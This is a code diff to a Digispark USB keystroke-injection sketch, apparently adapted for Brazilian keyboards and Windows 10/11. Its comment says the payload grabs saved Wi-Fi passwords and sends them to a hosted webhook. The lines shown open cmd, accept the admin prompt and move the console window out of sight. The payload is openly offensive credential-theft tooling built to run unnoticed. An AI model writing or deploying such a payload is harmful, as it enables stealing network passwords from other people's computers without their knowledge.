@@ -1,6 +1,9 @@
 /*
-  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
- rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
+  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd window
+
+  Adaptado e testado por lfparizzi em:
+  Windows 11
+  Windows 10
 */
 
 
@@ -32,13 +35,11 @@ void loop() {
   DigiKeyboardPtBr.print("cmd /k mode con: cols=18 lines=1");//start cmd
   DigiKeyboardPtBr.delay(200);
   DigiKeyboardPtBr.sendKeyStroke(KEY_TAB); 
-  DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);//turn on admin privileges
+  DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE); //turn on admin privileges
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER); //run
   DigiKeyboardPtBr.delay(1500);
   //### Inicio bloco: Esconder o terminal ###
   DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
-  DigiKeyboardPtBr.sendKeyStroke(KEY_M); //goto Move
-  DigiKeyboardPtBr.sendKeyStroke(KEY_O); //goto Move
   DigiKeyboardPtBr.sendKeyStroke(KEY_V); //goto Move
   for(int i =0; i < 100; i++)
     {
